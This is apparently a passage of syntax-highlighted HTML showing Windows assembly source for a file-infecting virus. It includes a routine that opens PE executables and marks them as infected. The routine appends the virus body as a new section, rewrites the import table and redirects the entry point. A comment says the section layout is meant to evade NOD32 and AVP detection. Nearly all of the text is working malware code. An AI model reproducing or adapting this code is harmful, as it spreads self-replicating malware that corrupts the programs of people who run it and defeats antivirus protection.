                        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">GetProcAddress@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                      </span><span class="sc1">;</span><span class="sc0">
                      </span><span class="sc1">; Detect if any breakpoints on (host) API</span><span class="sc0">
                      </span><span class="sc1">;</span><span class="sc0">
                      </span><span class="sc1">; .if byte ptr [eax] == 0CCh</span><span class="sc0">
                      </span><span class="sc1">; .endif</span><span class="sc0">
                      </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Terminate</span><span class="sc0">       </span><span class="sc1">; bad...</span><span class="sc0">
                        </span><span class="sc9">.endif</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc9">.endw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_IMPORT_DESCRIPTOR</span><span class="sc0">
        </span><span class="sc9">.until</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Terminate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ExitProcess@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">RestoreOriginalImports</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様陳陳</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wfd</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">CreateFileA@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc4">&gt;,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILESIZE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRSIZE</span><span class="sc0">
        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">CreateFileMappingA@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hMap</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">MapViewOfFile@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapBase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">e_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">IsBadReadPtr@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; really needed only for '*.*' mask</span><span class="sc0">
        </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc4">&amp;&amp;</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">w</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc3">"EP"</span><span class="sc0"> </span><span class="sc4">&amp;&amp;</span><span class="sc0"> </span><span class="sc5">w</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc3">"ZM"</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Continue</span><span class="sc0">
        </span><span class="sc9">.else</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoNotInfect</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">

</span><span class="sc5">Continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">ImageBase</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">d</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OriginalEntryPoint</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">w</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">NumberOfSections</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Temp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">PointerToRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kuto_Offs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc5">FILESIZE</span><span class="sc0">              </span><span class="sc1">; for now, skip if extra data</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoNotInfect</span><span class="sc0">     </span><span class="sc1">; found at EOF</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">

        </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc9">Import</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; marker</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoNotInfect</span><span class="sc0">
        </span><span class="sc9">.else</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">d</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc9">Import</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">

</span><span class="sc1">; Update new section info... &amp; PE header...</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">VirtualSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SectionAlignment</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc9">align</span><span class="sc5">@</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kuto_RVA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">AddressOfEntryPoint</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRSIZE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SectionAlignment</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc9">align</span><span class="sc5">@</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SizeOfImage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc9">Import</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">d</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OriginalImportTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; Convert import table entries to RVA...</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ImportTableBegin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VirEntry</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kuto_RVA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc9">Import</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">d</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc9">Import</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">VirEnd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ImportTableBegin</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">K32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Name</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">K32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; FirstThunk</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">szGMH</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ImportTableBegin</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleA@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">szLL</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ImportTableBegin</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LoadLibrary@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">szGPA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ImportTableBegin</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcAddress@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">szEXIT</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ImportTableBegin</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcess@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szK32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ImportTableBegin</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">K32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA@</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ImportTableBegin</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">K32_IAT_RVA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">d</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImportTableBegin</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; TimeDateStamp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">d</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImportTableBegin</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; ForwaderChain</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Switch section...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If we dont do this, NOD32 detects it as 'probably unknown WIN32 virus'</span><span class="sc0">
</span><span class="sc1">; and AVP as 'Type_Win32'.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Temp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsd</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kuto_Name</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsd</span><span class="sc0">

</span><span class="sc1">; Append...</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapBase</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILESIZE</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirEntry</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRSIZE</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">w</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">NumberOfSections</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Infected</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILESIZE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRSIZE</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ExitInfect</span><span class="sc0">

</span><span class="sc5">DoNotInfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILESIZE</span><span class="sc0">

</span><span class="sc5">ExitInfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SetFilePointer@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; FILE_BEGIN</span><span class="sc0">
        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SetEndOfFile@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">UnmapViewOfFile@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapBase</span><span class="sc4">]</span><span class="sc0">
